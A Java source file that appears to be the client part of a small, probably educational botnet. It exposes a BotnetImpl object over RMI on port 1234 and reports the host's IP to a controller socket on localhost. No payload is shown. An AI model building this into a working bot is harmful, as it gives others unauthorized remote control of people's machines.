/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package client;

import SServer_package.SServer;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.rmi.RemoteException;
import java.util.logging.Level;
import java.util.logging.Logger;
import rmi.IBotnet;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.util.Enumeration;

/**
 *
 * @author haiclover
 */
public class RMIClient {
    
    public static String getIP() throws SocketException{
        Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
        while( ifaces.hasMoreElements() )
        {
            NetworkInterface iface = ifaces.nextElement();
            String name = iface.getName();
//            if (name.equals("wlp0s20f3")){
            Enumeration<InetAddress> addresses = iface.getInetAddresses();

            while( addresses.hasMoreElements() )
            {
                InetAddress addr = addresses.nextElement();
                if( addr instanceof Inet4Address && !addr.isLoopbackAddress() )
                {
                  return addr.toString();
                }
            }
//            }

        }
        return null;
    }
    
    public static void main(String[] args){
        try {
            IBotnet botnet = new BotnetImpl();
            LocateRegistry.createRegistry(1234);
            String ip = getIP();
            Naming.bind("rmi:/" + ip + ":1234/BotnetRMI", botnet);
            System.out.println(">>>>>INFO: RMI Server started!!!!!!!!");
            Socket socket = new Socket("127.0.0.1", 2345);
            BufferedWriter writer = new BufferedWriter (new OutputStreamWriter(socket.getOutputStream()));
            if (ip != null){
                writer.write(ip);
                writer.write("\n");
                writer.flush();
            }
            writer.close();
            socket.close();
        } catch (RemoteException ex) {
            Logger.getLogger(RMIClient.class.getName()).log(Level.SEVERE, null, ex);
        } catch (MalformedURLException ex) {
            Logger.getLogger(RMIClient.class.getName()).log(Level.SEVERE, null, ex);
        } catch (AlreadyBoundException ex) {
            Logger.getLogger(RMIClient.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(RMIClient.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
}
